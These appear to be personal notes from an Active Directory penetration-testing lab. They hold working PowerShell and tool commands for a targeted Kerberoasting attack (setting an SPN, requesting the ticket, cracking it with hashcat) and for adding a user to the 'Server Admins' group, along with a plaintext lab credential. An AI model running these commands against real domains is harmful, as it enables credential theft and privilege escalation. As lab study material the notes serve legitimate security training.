# Active Directory Compromise 

### Kerberoasting Attack 
Windows Device
credentials: 
mssqladm:DBAilfreight1!
```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force #Create secure password 

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword) #Apply the credential to the existing account mssqladm

Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose #Creates spn named acmetesting/LEGIT
```
Host Device 
```
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```
```
hashcat hash  /usr/share/wordlists/rockyou.txt
```

### DCSync Attack 
Part 1 
```
$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force #Purpose: Converts a plain-text string password into a SecureString object. 
Context: The -Force flag suppresses confirmation warnings about creating a secure string from plain text.
```
Part 2 
```
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass) #Combines the username INLANEFREIGHT\timmons # Purpose: Combines the username (INLANEFREIGHT\timmons) and the secure password ($timpass) into a single PSCredential object.


```
Part 3
```
$group = Convert-NameToSid "Server Admins"
```
Part 4

```
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```